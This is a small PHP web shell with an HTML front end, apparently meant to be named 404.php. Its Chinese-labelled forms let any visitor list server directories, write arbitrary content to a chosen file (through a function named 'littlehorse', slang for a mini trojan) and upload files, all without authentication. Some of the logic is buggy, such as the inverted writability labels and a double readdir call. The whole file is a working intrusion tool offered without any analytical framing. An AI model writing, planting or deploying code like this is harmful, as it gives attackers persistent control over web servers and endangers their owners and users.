<html>
<head>
    <meta charset="utf-8">
</head>
<body>
<form action="404.php" method="get">
    <input type="text" name="sub">
    <input type="submit" value="show">
</form>
<form action="404.php" method="post">
    <input type="text" name="dir" /><br />
    <textarea  name="content"></textarea><br />
    <input type="submit" value="提交" />
</form>
<form action="" enctype="multipart/form-data" method="post"
      name="uploadfile">上传文件：<input type="file" name="upfile" /><br>
    <input type="submit" value="上传" /></form>
</body>
</html>

<?php
    echo __DIR__;
    if($dir=$_GET["sub"]){
        listdir($dir);
    }
    if($content=trim($_POST["content"])){
        if($horse_dir=trim($_POST["dir"])){
            littlehorse($content,$horse_dir);
        }
    }
    if(is_uploaded_file($_FILES["upfile"]["tmp_name"])){
        uploadfiles($_FILES["upfile"]);
    }
    function listdir($dir){
        if(is_dir($dir)) {
            echo "</br>";
            echo "列出".$dir."目录下的所有文件:"."</br>";
            if ($di = opendir($dir)) {
                while (readdir($di) !== false) {
                    if(is_readable($di)){
                        $useable = true;
                    }else{
                        $useable = false;
                    }
                    echo $dire=$dir.readdir($di)."   ".($useable?'不可写入':'可写入')."</br>";
                }
                closedir($di);
            }
        }else if($dir!=NULL){
            echo "not a direction!";
        }
    }
    function littlehorse($content,$horse_dir){
        $horse_dir=__DIR__.'\\'.$horse_dir;
        echo "</br>".$horse_dir;
            $fp=fopen($horse_dir,'w');
            fwrite($fp,$content);
            fclose($fp);
    }
    function uploadfiles($upfile){
        $tmp=$upfile["tmp_name"];
        $dire=__DIR__."/".$upfile["name"];
        echo "</br>"."The temp direction is:".$tmp." will move to  ".$dire;
        if(move_uploaded_file($tmp,$dire)){
            echo "</br>"."ok!";
        }else{
            echo "</br>"."false!";
        }
    }
?>